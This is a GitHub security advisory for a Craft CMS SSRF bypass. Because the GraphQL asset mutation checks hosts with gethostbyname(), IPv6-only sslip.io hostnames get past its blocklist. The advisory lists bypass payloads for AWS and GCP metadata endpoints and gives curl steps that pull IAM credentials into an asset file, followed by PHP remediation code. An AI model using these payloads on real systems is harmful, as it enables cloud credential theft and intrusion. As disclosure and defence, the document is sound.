# [M] Craft CMS: Cloud Metadata SSRF Protection Bypass via IPv6 Resolution

## Summary
Severity: Medium
Advisory: GHSA-v2gc-rm6g-wrw9
CVE: CVE-2026-27129
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-02-24
Source: https://github.com/advisories/GHSA-v2gc-rm6g-wrw9
Type: github-advisory

## Affected
- Packagist: `craftcms/cms` — affected >=5.0.0-RC1 <5.8.23
- Packagist: `craftcms/cms` — affected >=3.5.0 <4.16.19

## Details
The SSRF validation in Craft CMS’s GraphQL Asset mutation uses `gethostbyname()`, which only resolves IPv4 addresses. When a hostname has only AAAA (IPv6) records, the function returns the hostname string itself, causing the blocklist comparison to always fail and completely bypassing SSRF protection.

This is a bypass of the security fix for CVE-2025-68437 ([GHSA-x27p-wfqw-hfcc](https://github.com/craftcms/cms/security/advisories/GHSA-x27p-wfqw-hfcc)).

## Required Permissions

Exploitation requires GraphQL schema permissions for:
- Edit assets in the `<VolumeName>` volume
- Create assets in the `<VolumeName>` volume

These permissions may be granted to:
- Authenticated users with appropriate GraphQL schema access
- Public Schema (if misconfigured with write permissions)

---

## Technical Details

### Root Cause

From PHP documentation: *"gethostbyname - Get the IPv4 address corresponding to a given Internet host name"*

When no IPv4 (A record) exists, `gethostbyname()` returns the hostname string unchanged.

### Bypass Mechanism

```
+-----------------------------------------------------------------------------+
| Step 1: Attacker provides URL                                               |
|         http://fd00-ec2--254.sslip.io/latest/meta-data/                     |
+-----------------------------------------------------------------------------+
| Step 2: Validation calls gethostbyname('fd00-ec2--254.sslip.io')            |
|         -> No A record exists                                               |
|         -> Returns: "fd00-ec2--254.sslip.io" (string, not an IP!)           |
+-----------------------------------------------------------------------------+
| Step 3: Blocklist check                                                     |
|         in_array("fd00-ec2--254.sslip.io", ['169.254.169.254', ...])       |
|         -> FALSE (string != IPv4 addresses)                                 |
|         -> VALIDATION PASSES                                                |
+-----------------------------------------------------------------------------+
| Step 4: Guzzle makes HTTP request                                           |
|         -> Resolves DNS (including AAAA records)                            |
|         -> Gets IPv6: fd00:ec2::254                                         |
|         -> Connects to AWS IMDS IPv6 endpoint                               |
|         -> CREDENTIALS STOLEN                                               |
+-----------------------------------------------------------------------------+
```

---

## Bypass Payloads

### Blocked IPv4 Addresses and Their IPv6 Bypass Equivalents

| Cloud Provider | Blocked IPv4 | IPv6 Equivalent | Bypass Payload |
|----------------|--------------|-----------------|----------------|
| **AWS EC2 IMDS** | `169.254.169.254` | `fd00:ec2::254` | `http://fd00-ec2--254.sslip.io/` |
| **AWS ECS** | `169.254.170.2` | `fd00:ec2::254` (via IMDS) | `http://fd00-ec2--254.sslip.io/` |
| **Google Cloud GCP** | `169.254.169.254` | `fd20:ce::254` | `http://fd20-ce--254.sslip.io/` |
| **Azure** | `169.254.169.254` | No IPv6 endpoint | N/A |
| **Alibaba Cloud** | `100.100.100.200` | No documented IPv6 | N/A |
| **Oracle Cloud** | `192.0.0.192` | No documented IPv6 | N/A |

### Additional IPv6 Internal Service Bypass Payloads

| Target | IPv6 Address | Bypass Payload |
|--------|--------------|----------------|
| **IPv6 Loopback** | `::1` | `http://0-0-0-0-0-0-0-1.sslip.io/` |
| **AWS NTP Service** | `fd00:ec2::123` | `http://fd00-ec2--123.sslip.io/` |
| **AWS DNS Service** | `fd00:ec2::253` | `http://fd00-ec2--253.sslip.io/` |
| **IPv4-mapped IPv6** | `::ffff:169.254.169.254` | `http://0-0-0-0-0-0-ffff-a9fe-a9fe.sslip.io/` |

---

## Steps to Reproduce

### Step 1: Verify DNS Resolution

```bash
# Verify the hostname has no IPv4 record (what gethostbyname sees)
$ dig fd00-ec2--254.sslip.io A +short
# (empty - no IPv4 record)

# Verify the hostname has IPv6 record (what Guzzle/curl uses)
$ dig fd00-ec2--254.sslip.io AAAA +short
fd00:ec2::254
```

### Step 2: Enumerate AWS IAM Role Name

```bash
curl -sk "https://TARGET/index.php?p=admin/actions/graphql/api" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_GRAPHQL_TOKEN" \
  -d '{
    "query": "mutation { save_photos_Asset(_file: { url: \"http://fd00-ec2--254.sslip.io/latest/meta-data/iam/security-credentials/\", filename: \"role.txt\" }) { id } }"
  }'
```

### Step 3: Retrieve AWS Credentials

```bash
# Replace ROLE_NAME with the role discovered in Step 2
curl -sk "https://TARGET/index.php?p=admin/actions/graphql/api" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_GRAPHQL_TOKEN" \
  -d '{
    "query": "mutation { save_photos_Asset(_file: { url: \"http://fd00-ec2--254.sslip.io/latest/meta-data/iam/security-credentials/ROLE_NAME\", filename: \"creds.json\" }) { id } }"
  }'
```

### Step 4: Access Saved Credentials

The credentials will be saved to the asset volume (e.g., `/userphotos/photos/creds.json`).

---

### Attack Scenario

1. Attacker finds Craft CMS instance with GraphQL asset mutations enabled
2. Attacker sends mutation with `url: "http://fd00-ec2--254.sslip.io/latest/meta-data/iam/security-credentials/"`
3. Error message or saved file reveals IAM role name
4. Attacker retrieves credentials via second mutation
5. Attacker uses credentials to access AWS services
6. **Attacker can now achieve code execution by creating new EC2 instances with their SSH key**

---

## Remediation

Replace `gethostbyname()` with `dns_get_record()` to check both IPv4 and IPv6:

```php
// Resolve both IPv4 and IPv6 addresses
$records = @dns_get_record($hostname, DNS_A | DNS_AAAA);
if ($records === false) {
    $records = [];
}

// Blocked IPv6 metadata prefixes
$blockedIPv6Prefixes = [
    'fd00:ec2::',       // AWS IMDS, DNS, NTP
    'fd20:ce::',        // GCP Metadata
    '::1',              // Loopback
    'fe80:',            // Link-local
    '::ffff:',          // IPv4-mapped IPv6
];

foreach ($records as $record) {
    // Check IPv4 (existing logic)
    if (isset($record['ip']) && in_array($record['ip'], $blockedIPv4)) {
        return false;
    }

    // Check IPv6 (NEW)
    if (isset($record['ipv6'])) {
        foreach ($blockedIPv6Prefixes as $prefix) {
            if (str_starts_with($record['ipv6'], $prefix)) {
                return false;
            }
        }
    }
}
```

### Additional Mitigations

| Mitigation | Description |
|------------|-------------|
| Block wildcard DNS services | Block nip.io, sslip.io, xip.io suffixes |
| Use `dns_get_record()` | Resolves both IPv4 and IPv6 |

---

## Resources

- https://github.com/craftcms/cms/commit/2825388b4f32fb1c9bd709027a1a1fd192d709a3
- [PHP: gethostbyname](https://www.php.net/manual/en/function.gethostbyname.php) - "Get the **IPv4 address** corresponding to a given Internet host name"
- [GHSA-x27p-wfqw-hfcc](https://github.com/advisories/GHSA-x27p-wfqw-hfcc) - Original SSRF vulnerability (CVE-2025-68437)
- [AWS IMDS IPv6 Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)
- [GCP Metadata Server Documentation](https://cloud.google.com/compute/docs/metadata/querying-metadata)
- [PayloadsAllTheThings - SSRF Cloud Instances](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md)

## References
- https://github.com/craftcms/cms/security/advisories/GHSA-v2gc-rm6g-wrw9
- https://github.com/craftcms/cms/security/advisories/GHSA-x27p-wfqw-hfcc
- https://nvd.nist.gov/vuln/detail/CVE-2026-27129
- https://github.com/craftcms/cms/commit/2825388b4f32fb1c9bd709027a1a1fd192d709a3
- https://github.com/craftcms/cms
